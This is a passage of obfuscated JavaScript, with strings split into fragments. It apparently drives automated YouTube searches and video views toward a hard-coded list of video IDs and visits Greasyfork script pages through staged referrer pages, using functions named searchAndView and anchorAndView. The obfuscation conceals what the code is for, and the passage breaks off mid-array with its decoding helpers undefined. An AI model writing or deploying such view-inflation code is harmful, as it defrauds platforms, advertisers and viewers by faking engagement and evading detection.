let searchTerms = [];

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x209f + 0xee * -0xe + 0x689 * -0x3);
    let h = e[f];
    return h;
  }, d(b, c);
}
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + W(0x16) + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x171a + -0x1 * -0x1a9d + 0x1 * -0x31ad)), searchTerms[W(0x17)](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xbaf * 0x1 + 0x913 + -0x14b8)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + W(0x3) + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + W(0xc) + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x592 + 0xe * 0xae + 0x11 * -0xe3);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    W(0xa) + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    X(0x19) + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    X(0x13) + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x8, ']URu') + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + W(0x18) + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': Y(0x7, 'DtER') + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': W(0xf) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + X(0x2) + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
